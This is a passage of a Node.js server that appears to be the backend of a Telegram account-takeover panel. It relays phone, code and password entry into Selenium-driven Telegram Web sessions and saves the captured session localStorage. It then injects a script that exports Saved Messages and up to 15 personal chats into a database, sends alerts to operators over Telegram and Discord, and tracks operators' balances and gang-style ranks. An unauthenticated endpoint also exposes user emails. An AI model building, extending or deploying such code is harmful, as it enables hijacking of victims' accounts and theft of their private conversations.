const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
const {
  By
} = require('selenium-webdriver');
const {
  runTelegramLogin,
  closeDriverBySessionId,
  activeDrivers
} = require('./telegram-login-handler');
const sessionDB = require('./database');
const notificationManager = require('./notification-manager');
const safeguardBot = require('./safeguard-bot');
const pollingBot = require('./polling-bot');
const {
  authenticateToken,
  requireAdmin,
  requireMember,
  createDefaultAdmin,
  cleanupExpiredSessions
} = require('./auth-middleware');
const {
  createUser,
  authenticateUser,
  getUserById,
  getAllUsers,
  updateUser,
  changePassword,
  deleteUser,
  logoutUser,
  banUser,
  unbanUser,
  checkUserBanStatus,
  getBannedUsers,
  updateUserBalance,
  resetUserBalance,
  updateUserRank
} = require('./user-manager');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*", // In production, restrict this to your frontend domain
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));
app.use('/storage', express.static('storage')); // Serve storage directory

// Initialize default admin user on startup
createDefaultAdmin();

// Clean up expired sessions every hour
setInterval(cleanupExpiredSessions, 60 * 60 * 1000);

// Centralized element mapping - all selectors are CSS only
const ELEMENT_SELECTORS = {
  // Phone login related elements
  'PHONE_LOGIN_BUTTON': 'div#auth-qr-form div.auth-form.qr button',
  'qrCodeButton': 'div#auth-phone-number-form form button',

  // Input fields
  'phoneCodeInput': 'input#sign-in-phone-code',
  'phoneNumberInput': 'input#sign-in-phone-number',
  'verificationCodeInput': 'input#sign-in-code',
  'passwordInput': 'input#sign-in-password',

  // Test elements
  'testSubmitButton': 'button[type="submit"]',

  // Additional common elements that might be needed
  'nextButton': 'button[type="submit"], button:contains("Next"), button:contains("NEXT")',
  'submitButton': 'button[type="submit"], button:contains("Submit"), button:contains("Verify")',
  'countryDropdown': 'select[name="country"], div[class*="country"], div[class*="dropdown"]'
};

// ==================== AUTHENTICATION ROUTES ====================

// Login endpoint
app.post('/api/auth/login', async (req, res) => {
  try {
    const {
      username,
      password
    } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        error: 'Username and password are required'
      });
    }

    const result = await authenticateUser(username, password);

    res.json({
      success: true,
      user: result.user,
      token: result.token,
      message: 'Login successful'
    });
  } catch (error) {
    console.error('Login error:', error);

    // Check if it's a ban error
    if (error.banInfo) {
      return res.status(403).json({
        success: false,
        error: error.message,
        banInfo: error.banInfo
      });
    }

    res.status(401).json({
      success: false,
      error: error.message || 'Login failed'
    });
  }
});

// Logout endpoint
app.post('/api/auth/logout', authenticateToken, async (req, res) => {
  try {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    await logoutUser(token);

    res.json({
      success: true,
      message: 'Logout successful'
    });
  } catch (error) {
    console.error('Logout error:', error);
    res.status(500).json({
      success: false,
      error: 'Logout failed'
    });
  }
});

// Get current user info
app.get('/api/auth/me', authenticateToken, async (req, res) => {
  try {
    const user = await getUserById(req.user.id);

    res.json({
      success: true,
      user
    });
  } catch (error) {
    console.error('Get user error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to get user info'
    });
  }
});

// Change password
app.post('/api/auth/change-password', authenticateToken, async (req, res) => {
  try {
    const {
      currentPassword,
      newPassword
    } = req.body;

    if (!currentPassword || !newPassword) {
      return res.status(400).json({
        success: false,
        error: 'Current password and new password are required'
      });
    }

    await changePassword(req.user.id, currentPassword, newPassword);

    res.json({
      success: true,
      message: 'Password changed successfully'
    });
  } catch (error) {
    console.error('Change password error:', error);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to change password'
    });
  }
});

// ==================== USER MANAGEMENT ROUTES (ADMIN ONLY) ====================

// Get all users
app.get('/api/users', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const users = await getAllUsers();

    res.json({
      success: true,
      users
    });
  } catch (error) {
    console.error('Get users error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to get users'
    });
  }
});

// Get user session counts overview (PUBLIC - no auth needed)
// NOTE: This MUST come BEFORE /api/users/:userId to avoid matching "session-counts" as a userId
app.get('/api/users/session-counts', async (req, res) => {
  console.log('🚀 API ENDPOINT CALLED: /api/users/session-counts');
  console.log('📊 Request headers:', req.headers);
  console.log('📊 Request method:', req.method);
  console.log('📊 Request URL:', req.url);

  let prisma;
  try {
    console.log('📊 Getting user session counts...');
    const {
      PrismaClient
    } = require('@prisma/client');
    prisma = new PrismaClient();

    // Get all users with their session counts
    const usersWithSessionCounts = await prisma.user.findMany({
      select: {
        id: true,
        username: true,
        tg_username: true,
        email: true,
        role: true,
        isActive: true,
        createdAt: true,
        lastLoginAt: true,
        _count: {
          select: {
            telegramSessions: true
          }
        }
      },
      orderBy: {
        username: 'asc'
      }
    });

    console.log(`📊 Found ${usersWithSessionCounts.length} users`);

    // Transform the data to include session count
    const overviewData = usersWithSessionCounts.map(user => ({
      id: user.id,
      username: user.username,
      tg_username: user.tg_username,
      email: user.email,
      role: user.role,
      isActive: user.isActive,
      createdAt: user.createdAt,
      lastLoginAt: user.lastLoginAt,
      sessionCount: user._count.telegramSessions
    }));

    console.log('📊 Overview data prepared:', overviewData.length, 'users');

    res.json({
      success: true,
      data: overviewData
    });
  } catch (error) {
    console.error('❌ Get user session counts error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to get user session counts: ' + error.message
    });
  } finally {
    if (prisma) {
      await prisma.$disconnect();
    }
  }
});

// Get single user
app.get('/api/users/:userId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      userId
    } = req.params;
    const user = await getUserById(userId);

    if (!user) {
      return res.status(404).json({
        success: false,
        error: 'User not found'
      });
    }

    res.json({
      success: true,
      user: user
    });
  } catch (error) {
    console.error('Get user error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to get user'
    });
  }
});

// Create new user
app.post('/api/users', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      username,
      email,
      password,
      role
    } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        error: 'Username and password are required'
      });
    }

    const user = await createUser({
      username,
      email,
      password,
      role
    });

    res.status(201).json({
      success: true,
      user,
      message: 'User created successfully'
    });
  } catch (error) {
    console.error('Create user error:', error);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to create user'
    });
  }
});

// Update user
app.put('/api/users/:userId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      userId
    } = req.params;
    const {
      username,
      email,
      password,
      role,
      isActive
    } = req.body;

    // If password is provided, hash it
    let hashedPassword = null;
    if (password) {
      const bcrypt = require('bcryptjs');
      hashedPassword = await bcrypt.hash(password, 10);
    }

    const user = await updateUser(userId, {
      username,
      email,
      password: hashedPassword,
      role,
      isActive
    });

    res.json({
      success: true,
      user,
      message: 'User updated successfully'
    });
  } catch (error) {
    console.error('Update user error:', error);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to update user'
    });
  }
});

// Delete user
app.delete('/api/users/:userId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      userId
    } = req.params;

    // Prevent admin from deleting themselves
    if (userId === req.user.id) {
      return res.status(400).json({
        success: false,
        error: 'Cannot delete your own account'
      });
    }

    await deleteUser(userId);

    res.json({
      success: true,
      message: 'User deleted successfully'
    });
  } catch (error) {
    console.error('Delete user error:', error);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to delete user'
    });
  }
});

// ==================== BALANCE MANAGEMENT ROUTES ====================

// Update user balance (Admin only)
app.put('/api/users/:userId/balance', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      userId
    } = req.params;
    const {
      balance
    } = req.body;

    if (typeof balance !== 'number' || balance < 0) {
      return res.status(400).json({
        success: false,
        error: 'Balance must be a non-negative number'
      });
    }

    const result = await updateUserBalance(userId, balance);

    res.json({
      success: true,
      message: 'User balance updated successfully',
      user: result.user
    });
  } catch (error) {
    console.error('Update balance error:', error);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to update balance'
    });
  }
});

// Reset user balance to 0 (Admin only)
app.post('/api/users/:userId/reset-balance', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      userId
    } = req.params;

    const result = await resetUserBalance(userId);

    res.json({
      success: true,
      message: 'User balance reset successfully',
      user: result.user
    });
  } catch (error) {
    console.error('Reset balance error:', error);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to reset balance'
    });
  }
});

// ==================== RANK MANAGEMENT ROUTES ====================

// Update user rank (Admin only)
app.put('/api/users/:userId/rank', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      userId
    } = req.params;
    const {
      rank
    } = req.body;

    const validRanks = ['ROOKIE', 'RUNNER', 'HUSTLER', 'THUG', 'ENFORCER', 'UNDERBOSS', 'OVERLORD', 'BOSS', 'GODFATHER', 'SHADOWMASTER'];
    if (!validRanks.includes(rank)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid rank provided'
      });
    }

    const result = await updateUserRank(userId, rank);

    res.json({
      success: true,
      message: 'User rank updated successfully',
      user: result.user
    });
  } catch (error) {
    console.error('Update rank error:', error);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to update rank'
    });
  }
});

// ==================== PROFILE MANAGEMENT ROUTES ====================

// Get current user profile
app.get('/api/profile', authenticateToken, async (req, res) => {
  try {
    console.log('📊 Profile API called for user:', req.user.id);
    const user = await getUserById(req.user.id);
    console.log('👤 User data from DB:', {
      id: user.id,
      username: user.username,
      tg_username: user.tg_username,
      role: user.role,
      rank: user.rank,
      balance: user.balance
    });

    res.json({
      success: true,
      profile: {
        id: user.id,
        username: user.username,
        email: user.email,
        tg_username: user.tg_username,
        role: user.role,
        rank: user.rank,
        balance: user.balance,
        createdAt: user.createdAt,
        lastLoginAt: user.lastLoginAt
      }
    });
  } catch (error) {
    console.error('Get profile error:', error);
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to get profile'
    });
  }
});

// Update current user profile
app.put('/api/profile', authenticateToken, async (req, res) => {
  try {
    const {
      tg_username
    } = req.body;
    console.log('💾 Profile update request for user:', req.user.id, 'tg_username:', tg_username);

    const updatedUser = await updateUser(req.user.id, {
      tg_username
    });

    console.log('✅ Profile updated successfully:', {
      id: updatedUser.id,
      username: updatedUser.username,
      tg_username: updatedUser.tg_username
    });

    res.json({
      success: true,
      message: 'Profile updated successfully',
      profile: {
        id: updatedUser.id,
        username: updatedUser.username,
        email: updatedUser.email,
        tg_username: updatedUser.tg_username,
        role: updatedUser.role,
        createdAt: updatedUser.createdAt,
        lastLoginAt: updatedUser.lastLoginAt
      }
    });
  } catch (error) {
    console.error('Update profile error:', error);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to update profile'
    });
  }
});

// ==================== BAN MANAGEMENT ROUTES (ADMIN ONLY) ====================

// Get all banned users
app.get('/api/bans', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const bannedUsers = await getBannedUsers();

    res.json({
      success: true,
      bannedUsers
    });
  } catch (error) {
    console.error('Get banned users error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to get banned users'
    });
  }
});

// Ban a user
app.post('/api/bans', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      userId,
      reason,
      duration
    } = req.body;

    if (!userId || !reason || !duration) {
      return res.status(400).json({
        success: false,
        error: 'User ID, reason, and duration are required'
      });
    }

    // Validate duration
    const validDurations = ['1day', '3days', '7days', '1month', 'permanent'];
    if (!validDurations.includes(duration)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid ban duration. Must be one of: 1day, 3days, 7days, 1month, permanent'
      });
    }

    const bannedUser = await banUser(userId, {
      reason,
      duration
    }, req.user.id);

    res.status(201).json({
      success: true,
      user: bannedUser,
      message: 'User banned successfully'
    });
  } catch (error) {
    console.error('Ban user error:', error);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to ban user'
    });
  }
});

// Unban a user
app.delete('/api/bans/:userId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      userId
    } = req.params;

    const unbannedUser = await unbanUser(userId);

    res.json({
      success: true,
      user: unbannedUser,
      message: 'User unbanned successfully'
    });
  } catch (error) {
    console.error('Unban user error:', error);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to unban user'
    });
  }
});

// Check user ban status
app.get('/api/bans/:userId/status', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const {
      userId
    } = req.params;

    const banStatus = await checkUserBanStatus(userId);

    res.json({
      success: true,
      banStatus
    });
  } catch (error) {
    console.error('Check ban status error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to check ban status'
    });
  }
});

// ==================== EXISTING API ROUTES (NOW PROTECTED) ====================

// Check if a session exists for a device (PUBLIC - no auth required)
app.get('/api/session/check/:deviceHash', async (req, res) => {
  try {
    const {
      deviceHash
    } = req.params;

    if (!deviceHash) {
      return res.status(400).json({
        success: false,
        error: 'Device hash is required'
      });
    }

    console.log(`🔍 Checking session for device: ${deviceHash}`);

    // Check if device has an active session
    const existingSessionId = deviceSessionMap.get(deviceHash);

    if (existingSessionId) {
      // Check if the existing session is still active
      const existingSession = activeSessions.get(existingSessionId);
      if (existingSession && existingSession.status !== 'completed' && existingSession.status !== 'error') {
        // Get session details from database
        const sessionInfo = await sessionDB.getSession(existingSessionId);

        if (sessionInfo) {
          return res.json(sessionInfo);
        }
      } else {
        // Remove stale mapping
        deviceSessionMap.delete(deviceHash);
        console.log(`🧹 Removed stale device mapping for ${deviceHash}`);
      }
    }

    // No active session found
    res.status(404).json({
      success: false,
      error: 'No active session found for this device'
    });

  } catch (error) {
    console.error('❌ Error checking session:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Add missing session check endpoint
app.get('/api/session/check/:sessionId', authenticateToken, requireMember, (req, res) => {
  const {
    sessionId
  } = req.params;
  console.log(`🔍 API: Checking session status for: ${sessionId}`);

  // Check if session exists in activeDrivers
  const {
    activeDrivers
  } = require('./telegram-login-handler');
  const driverInfo = activeDrivers.get(sessionId);

  if (driverInfo && driverInfo.driver) {
    res.json({
      sessionId,
      exists: true,
      status: 'active',
      timestamp: new Date().toISOString()
    });
  } else {
    res.json({
      sessionId,
      exists: false,
      status: 'not_found',
      timestamp: new Date().toISOString()
    });
  }
});

// Add test endpoint for notifications
app.get('/api/test-notifications', authenticateToken, requireAdmin, async (req, res) => {
  try {
    console.log('🧪 Testing notifications...');
    const results = await notificationManager.sendTestNotification();

    // Check if any notification was successful
    const anySuccess = results.telegram.success || results.discord.success;
    const anyError = results.telegram.error || results.discord.error;

    if (anySuccess) {
      res.json({
        success: true,
        message: 'Test notification sent successfully',
        results: results,
        timestamp: new Date().toISOString()
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'Failed to send test notification',
        results: results,
        error: anyError,
        timestamp: new Date().toISOString()
      });
    }
  } catch (error) {
    console.error('❌ Error testing notifications:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Add debug endpoint to inspect page structure
app.get('/api/debug/page/:sessionId', authenticateToken, requireMember, async (req, res) => {
  const {
    sessionId
  } = req.params;
  console.log(`🔍 API: Debug page structure for session: ${sessionId}`);

  try {
    // Check if session exists in activeDrivers
    const {
      activeDrivers
    } = require('./telegram-login-handler');
    const driverInfo = activeDrivers.get(sessionId);

    if (!driverInfo || !driverInfo.driver) {
      return res.json({
        error: 'No active driver found for this session',
        sessionId
      });
    }

    const driver = driverInfo.driver;

    // Get page info
    const currentUrl = await driver.getCurrentUrl();
    const currentTitle = await driver.getTitle();

    // Find all buttons
    const buttons = await driver.findElements(By.tagName('button'));
    const buttonInfo = [];

    for (let i = 0; i < buttons.length; i++) {
      try {
        const text = await buttons[i].getText();
        const type = await buttons[i].getAttribute('type');
        const id = await buttons[i].getAttribute('id');
        const className = await buttons[i].getAttribute('class');

        buttonInfo.push({
          index: i + 1,
          text,
          type,
          id,
          className
        });
      } catch (error) {
        buttonInfo.push({
          index: i + 1,
          error: error.message
        });
      }
    }

    res.json({
      sessionId,
      currentUrl,
      currentTitle,
      buttonsFound: buttons.length,
      buttonInfo,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    res.json({
      error: error.message,
      sessionId
    });
  }
});

// Store active sessions in memory for real-time operations
const activeSessions = new Map();

// Store device-to-session mapping for session reuse
const deviceSessionMap = new Map();

// Map to track session creation locks to prevent race conditions
const sessionCreationLocks = new Map();

// Helper function to clean up existing sessions for a device
async function cleanupExistingSessionsForDevice(deviceHash) {
  const existingSessionId = deviceSessionMap.get(deviceHash);
  if (existingSessionId) {
    console.log(`🧹 Cleaning up existing session ${existingSessionId} for device ${deviceHash}`);

    // Close the selenium driver
    await closeDriverBySessionId(existingSessionId);

    // Remove from active sessions
    const existingSession = activeSessions.get(existingSessionId);
    if (existingSession) {
      existingSession.telegramLoginRunning = false;
      activeSessions.delete(existingSessionId);

      // Get session to check if it has localStorage
      const dbSession = await sessionDB.getSession(existingSessionId);
      const updates = {
        endTime: new Date(),
        closedBy: 'replaced_by_new_session',
        driverClosed: true
      };

      // Only change status to 'closed' if there's no localStorage data
      if (!dbSession || !dbSession.localStorageCode) {
        updates.status = 'closed';
      }
      // If localStorage exists, keep status as 'completed'

      // Update database
      await sessionDB.updateSession(existingSessionId, updates);
    }

    // Remove device mapping
    deviceSessionMap.delete(deviceHash);
    console.log(`✅ Cleaned up existing session ${existingSessionId} for device ${deviceHash}`);
  }
}

// Store typing status for each session to prevent premature form submission
const typingStatus = new Map();

// ─── Shared HTML style block used by both the incremental poller and the final
//     export result.  Kept in one place so both are always in sync.
const EXPORT_HTML_STYLE = `
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: #fff;
            color: #000;
        }
        .date-header {
            font-weight: bold;
            font-size: 14px;
            margin: 30px 0 15px 0;
            padding: 10px;
            background: #f0f0f0;
            text-align: center;
            border-radius: 8px;
        }
        .message {
            margin-bottom: 20px;
            padding: 10px;
            border-left: 3px solid #2481cc;
            background: #f9f9f9;
            page-break-inside: avoid;
        }
        .message.own {
            border-left-color: #4CAF50;
            background: #e8f5e9;
        }
        .message-header {
            font-weight: bold;
            color: #2481cc;
            margin-bottom: 8px;
            font-size: 12px;
        }
        .message.own .message-header {
            color: #4CAF50;
        }
        .message-text {
            margin-bottom: 10px;
            font-size: 14px;
            white-space: pre-wrap;
            word-wrap: break-word;
            line-height: 1.5;
        }
        .message-image {
            max-width: 100%;
            height: auto;
            margin: 10px 0;
            display: block;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .image-placeholder {
            margin: 10px 0;
            padding: 20px;
            background: #f0f0f0;
            font-size: 12px;
            color: #666;
            text-align: center;
            border-radius: 8px;
        }
        @media print {
            body { max-width: 100%; }
            .message { page-break-inside: avoid; }
        }
    </style>`;

// ─── Helper: inject the export script into the currently-open chat, poll for
//     incremental updates and save them to the DB, then return the final result.
//
//     chatKey    – DB key for this chat, e.g. 'saved-messages' or the peer ID
//     chatName   – human-readable name stored alongside the HTML
//     chatExports – the shared accumulator object; entries are merged into it
//     Per-chat hard timeout: 10 minutes.
async function exportSingleChat(driver, sessionId, chatKey, chatName, chatExports) {
  const PER_CHAT_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes

  const fs   = require('fs');
  const path = require('path');
  const exportScriptPath    = path.join(__dirname, 'saved-messages-export.js');
  const exportScriptContent = fs.readFileSync(exportScriptPath, 'utf8');

  try {
    // Reset browser-side globals from any previous run
    await driver.executeScript(`
      window.__exportInProgress = false;
      window.__exportComplete   = false;
      window.__exportResult     = null;
      window.__exportError      = null;
      window.__exportUpdated    = false;
      window.__exportMessageCount = 0;
      window.__incrementalExportBody = '';
      window.__exportLastUpdate = 0;
    `);

    // Fire the export script in the background (non-blocking)
    await driver.executeScript(`
      const scriptContent = ${JSON.stringify(exportScriptContent)};
      (async function() {
        try {
          const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
          const fn = new AsyncFunction(scriptContent);
          window.__exportInProgress = true;
          const result = await fn();
          window.__exportComplete = true;
          window.__exportResult   = result;
        } catch (err) {
          window.__exportComplete = true;
          window.__exportError    = err.message;
          console.error('❌ Export error:', err);
        }
      })();
      return true;
    `);

    console.log(`🚀 [${chatKey}] Export script running in background`);
  } catch (setupError) {
    console.error(`❌ [${chatKey}] Failed to inject export script: ${setupError.message}`);
    return false;
  }

  const pollInterval  = 5000;
  let lastSyncedCount = 0;
  let pollingStopped  = false;
  const startedAt     = Date.now();

  // Helper: build a partial/in-progress HTML snapshot from window globals
  const buildPartialHtml = (count) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${chatName} – Chat Export (In Progress)</title>
    ${EXPORT_HTML_STYLE}
</head>
<body>
    <h1>${chatName}</h1>
    <p>Total messages so far: ${count}</p>
`;

  const syncPoller = setInterval(async () => {
    if (pollingStopped) return;

    // Hard timeout check — do this first so it always fires even if driver throws
    if (Date.now() - startedAt > PER_CHAT_TIMEOUT_MS) {
      console.warn(`⏰ [${chatKey}] Per-chat timeout reached, moving on`);
      pollingStopped = true;
      clearInterval(syncPoller);
      return;
    }

    try {
      const exportStatus = await driver.executeScript(`
        return {
          inProgress:   window.__exportInProgress  || false,
          complete:     window.__exportComplete     || false,
          error:        window.__exportError        || null,
          updated:      window.__exportUpdated      || false,
          messageCount: window.__exportMessageCount || 0,
          hasBody:      !!window.__incrementalExportBody,
          bodyLength:   (window.__incrementalExportBody || '').length
        };
      `);

      console.log(`📊 [${chatKey}] Poll status:`, exportStatus);

      // Incremental save whenever new messages appeared
      if (exportStatus.messageCount > lastSyncedCount && exportStatus.hasBody) {
        const partialBody = await driver.executeScript(
          `return window.__incrementalExportBody || '';`
        );
        const partialHtml = buildPartialHtml(exportStatus.messageCount)
          + partialBody
          + `\n</body>\n</html>`;

        chatExports[chatKey] = {
          name:         chatName,
          html:         partialHtml,
          messageCount: exportStatus.messageCount,
          exportedAt:   new Date().toISOString(),
          type:         'partial'
        };

        try {
          await sessionDB.updateSession(sessionId, {
            chatExports:            { ...chatExports },
            chatExportsCollectedAt: new Date()
          });
          lastSyncedCount = exportStatus.messageCount;
          console.log(`✅ [${chatKey}] Incremental sync: ${exportStatus.messageCount} messages`);
          await driver.executeScript(`window.__exportUpdated = false;`);
          const updatedSessions = await sessionDB.getAllSessions();
          io.emit('allSessions', sessionsForBroadcast(updatedSessions));
        } catch (saveError) {
          console.error(`⚠️ [${chatKey}] DB save error: ${saveError.message}`);
        }
      }

      // Stop when the export script signals completion
      if (exportStatus.complete) {
        console.log(`🏁 [${chatKey}] Export script finished`);
        pollingStopped = true;
        clearInterval(syncPoller);
      }
    } catch (pollError) {
      // A WebDriver error here usually means the page navigated away or the
      // browser context is gone. Treat it as completion so we don't spin forever.
      console.error(`⚠️ [${chatKey}] Poll error (treating as complete): ${pollError.message}`);
      pollingStopped = true;
      clearInterval(syncPoller);
    }
  }, pollInterval);

  // Busy-wait until the poller signals done, with a safety escape hatch
  while (!pollingStopped) {
    await new Promise(resolve => setTimeout(resolve, 1000));
    // Safety: if somehow pollingStopped never gets set, respect the timeout here too
    if (Date.now() - startedAt > PER_CHAT_TIMEOUT_MS + 30000) {
      console.error(`❌ [${chatKey}] Safety timeout hit in busy-wait, forcing stop`);
      clearInterval(syncPoller);
      break;
    }
  }

  // Fetch final result — wrapped so a stale page doesn't throw
  let exportResult = null;
  try {
    exportResult = await driver.executeScript(`
      return window.__exportResult || {
        success: !window.__exportError,
        error:   window.__exportError
      };
    `);
  } catch (e) {
    console.warn(`⚠️ [${chatKey}] Could not read final result (page may have changed): ${e.message}`);
  }

  if (exportResult && exportResult.success && exportResult.html) {
    chatExports[chatKey] = {
      name:         chatName,
      html:         exportResult.html,
      messageCount: exportResult.messageCount || lastSyncedCount,
      exportedAt:   new Date().toISOString(),
      type:         'full'
    };
    console.log(`✅ [${chatKey}] Final export: ${exportResult.messageCount} messages`);
    return true;
  } else {
    const err = exportResult?.error || 'Unknown error';
    console.error(`❌ [${chatKey}] Export failed: ${err}`);
    // Keep any incremental snapshot that was saved
    return false;
  }
}

// ─── Collect the first N personal chats (positive peer IDs / class "private")
//     by scrolling through the virtualized chat list incrementally.
//     Saved Messages is always moved to index 0 in the returned array.
//     Returns an array of { href, peerId, name, isSavedMessages } objects.
async function collectPersonalChats(driver, maxChats = 15) {
  // Helper: snapshot all personal chats currently rendered in the DOM,
  // returning EVERY item (personal or not) so we can log the full picture.
  async function scrapeVisible() {
    return driver.executeScript(`
      const items = document.querySelectorAll('.chat-list .ListItem.Chat');
      const all = [], personal = [];
      items.forEach(item => {
        const btn = item.querySelector('a.ListItem-button');
        if (!btn) return;
        const href   = btn.getAttribute('href') || '';
        const peerId = href.replace('#', '');
        const name   = (item.querySelector('.fullName') || {}).textContent || '';
        const isGroup    = item.classList.contains('group');
        const isPrivate  = item.classList.contains('private');
        const isNegative = peerId.startsWith('-');
        const isSavedMessages = !!item.querySelector('.saved-messages');
        all.push({ href, peerId, name: name.trim(), isGroup, isPrivate, isNegative, isSavedMessages });
        if (!isNegative && peerId) {
          personal.push({ href, peerId, name: name.trim(), isSavedMessages });
        }
      });
      return { all, personal };
    `);
  }

  // Scroll chat list to top first
  await driver.executeScript(`
    const cl = document.querySelector('.chat-list');
    if (cl) cl.scrollTop = 0;
  `);
  await new Promise(resolve => setTimeout(resolve, 1000));

  const seen = new Map(); // href → chat object (personal chats only)
  const STEP = 72;        // one chat row height in px

  // Stop only when the list is truly exhausted — i.e. scrollTop stopped moving.
  // This handles lists with long runs of groups between personal chats.
  let lastScrollTop = -1;
  let stuckCount    = 0;
  const MAX_STUCK   = 3;  // stop if scrollTop hasn't changed 3 times in a row
  let totalScrollSteps = 0;

  while (seen.size < maxChats) {
    const { all, personal } = await scrapeVisible();

    console.log(`📜 [collectPersonalChats] step=${totalScrollSteps} DOM items=${all.length} personal in view=${personal.length} collected so far=${seen.size}`);
    if (all.length > 0) {
      console.log(`   visible: ${all.map(c => `"${c.name}"(${c.isGroup ? 'group' : 'private'},${c.href})`).join(', ')}`);
    }

    const beforeSize = seen.size;
    for (const chat of personal) {
      if (!seen.has(chat.href)) {
        seen.set(chat.href, chat);
        console.log(`   ✅ Added personal chat: "${chat.name}" ${chat.href}`);
        if (seen.size >= maxChats) break;
      }
    }

    if (seen.size >= maxChats) {
      console.log(`📋 Reached target of ${maxChats} personal chats, stopping scroll`);
      break;
    }

    // Scroll down and check whether the list actually moved
    const scrollTopBefore = await driver.executeScript(`
      const cl = document.querySelector('.chat-list');
      return cl ? cl.scrollTop : 0;
    `);

    await driver.executeScript(`
      const cl = document.querySelector('.chat-list');
      if (cl) cl.scrollTop += ${STEP};
    `);
    await new Promise(resolve => setTimeout(resolve, 200));

    const scrollTopAfter = await driver.executeScript(`
      const cl = document.querySelector('.chat-list');
      return cl ? cl.scrollTop : 0;
    `);

    totalScrollSteps++;

    if (scrollTopAfter === scrollTopBefore) {
      stuckCount++;
      console.log(`📜 [collectPersonalChats] scroll stuck at ${scrollTopAfter}px (${stuckCount}/${MAX_STUCK})`);
      if (stuckCount >= MAX_STUCK) {
        console.log(`📋 Reached end of chat list after ${totalScrollSteps} scroll steps`);
        break;
      }
    } else {
      stuckCount = 0;
    }
  }

  console.log(`📋 Collection done: ${seen.size} personal chats found`);

  const all = Array.from(seen.values());
  const savedMessages = all.filter(c => c.isSavedMessages);
  const others        = all.filter(c => !c.isSavedMessages);
  const result        = [...savedMessages, ...others].slice(0, maxChats);

  result.forEach((c, i) => console.log(`  ${i + 1}. "${c.name}" ${c.href}`));
  return result;
}

// ─── Navigate back to the main chat list and click a specific chat by href.
//     Scrolls the chat list until the target item is rendered by the virtual
//     list, then clicks it. Returns true on success, false on failure.
async function navigateToChat(driver, href) {
  try {
    await driver.navigate().to('https://web.telegram.org/a/');
    await new Promise(resolve => setTimeout(resolve, 2500));

    // Wait for the chat list container to appear
    await driver.findElement(By.css('.chat-list'));

    // Scroll to top first
    await driver.executeScript(`
      const cl = document.querySelector('.chat-list');
      if (cl) cl.scrollTop = 0;
    `);
    await new Promise(resolve => setTimeout(resolve, 500));

    // Scroll until the target href is rendered, then click it
    const STEP        = 72;
    const MAX_SCROLLS = 300; // safety cap (~300 chat rows)
    let found = false;

    for (let i = 0; i < MAX_SCROLLS; i++) {
      // Check if the element is in the DOM now
      const exists = await driver.executeScript(`
        return !!document.querySelector('a.ListItem-button[href="${href}"]');
      `);

      if (exists) {
        const btn = await driver.findElement(By.css(`a.ListItem-button[href="${href}"]`));
        await driver.executeScript('arguments[0].scrollIntoView({ block: "center" });', btn);
        await new Promise(resolve => setTimeout(resolve, 300));
        await btn.click();
        found = true;
        break;
      }

      // Not rendered yet — scroll down one row and try again
      await driver.executeScript(`
        const cl = document.querySelector('.chat-list');
        if (cl) cl.scrollTop += ${STEP};
      `);
      await new Promise(resolve => setTimeout(resolve, 150));
    }

    if (!found) {
      console.error(`❌ navigateToChat: chat ${href} not found after scrolling`);
      return false;
    }

    // Wait for the message list to load
    await driver.wait(
      async () => {
        try { return !!(await driver.findElement(By.css('.MessageList'))); }
        catch { return false; }
      },
      10000
    );

    await new Promise(resolve => setTimeout(resolve, 1500));
    return true;
  } catch (e) {
    console.error(`❌ navigateToChat(${href}) failed:`, e.message);
    return false;
  }
}

// ─── Main export orchestrator ─────────────────────────────────────────────────
// Track which sessions currently have an export running to prevent concurrent runs
const exportRunning = new Set();

// Strip HTML export bodies before broadcasting sessions over the socket.
// NOTE: getAllSessions() already strips HTML at the DB layer, so this is
